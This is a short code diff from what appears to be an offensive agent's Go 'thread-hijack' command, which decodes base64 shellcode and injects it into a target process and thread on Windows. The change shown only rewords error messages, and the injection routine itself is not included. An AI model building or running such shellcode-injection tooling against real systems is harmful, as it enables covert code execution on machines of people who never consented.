@@ -56,7 +56,7 @@ type ThreadHijackParams struct {
 // Execute executes the thread-hijack command
 func (c *ThreadHijackCommand) Execute(task structs.Task) structs.CommandResult {
 	if runtime.GOOS != "windows" {
-		return errorResult("Error: This command is only supported on Windows")
+		return errorResult("This command is only supported on Windows")
 	}
 
 	params, parseErr := unmarshalParams[ThreadHijackParams](task)
@@ -65,20 +65,20 @@ func (c *ThreadHijackCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if params.ShellcodeB64 == "" {
-		return errorResult("Error: No shellcode data provided")
+		return errorResult("No shellcode data provided")
 	}
 
 	if params.PID <= 0 {
-		return errorResult("Error: Invalid PID specified")
+		return errorResult("Invalid PID specified")
 	}
 
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
 	if err != nil {
-		return errorf("Error decoding shellcode: %v", err)
+		return errorf("decoding shellcode: %v", err)
 	}
 
 	if len(shellcode) == 0 {
-		return errorResult("Error: Shellcode data is empty")
+		return errorResult("Shellcode data is empty")
 	}
 
 	output, err := performThreadHijack(shellcode, uint32(params.PID), uint32(params.TID))
